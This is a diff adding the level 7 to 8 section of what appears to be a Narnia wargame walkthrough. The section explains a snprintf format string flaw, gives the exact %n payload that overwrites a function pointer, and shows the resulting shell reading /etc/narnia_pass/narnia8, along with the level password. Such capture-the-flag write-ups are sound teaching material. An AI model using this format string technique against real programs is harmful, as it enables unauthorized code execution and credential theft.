@@ -284,9 +284,33 @@ ahkiaziphu
 
 
 ### level 7 -> 8
+Like level 5, there is unsafe use of `snprintf` function that make the program vulnerable to string format attack.  
+We need to change the ptrf to the address of `hackedfunction()`, luckily the program print anything:
+```shell
+narnia7@narnia:/narnia$ ./narnia7 A
+goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
 
+before : ptrf() = 0x80486ff (0xffffd658)
+I guess you want to come to the hackedfunction...
+Welcome to the goodfunction, but i said the Hackedfunction..
+```
+So we need to change the content of `ptrf` whose addres is `0xffffd658` to the address of `hackedfunction()` whose addres is `0x8048724`.  
+We will do it in the way we do it in level 5: `<address to change>%<number we want to insert in decimal format>x%n`.
+```shell
+narnia7@narnia:/narnia$ python -c "print(int('0x8048724', 16))"
+134514468
+narnia7@narnia:/narnia$ ./narnia7 $(python -c "print('\x58\xd6\xff\xff%134514468x%n')")
+goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
+
+before : ptrf() = 0x80486ff (0xffffd658)
+I guess you want to come to the hackedfunction...
+Way to go!!!!$ cat /etc/narnia_pass/narnia8
+mohthuphog
+```
 **password:**
-
+mohthuphog
 
 ### level 8 -> 9
 
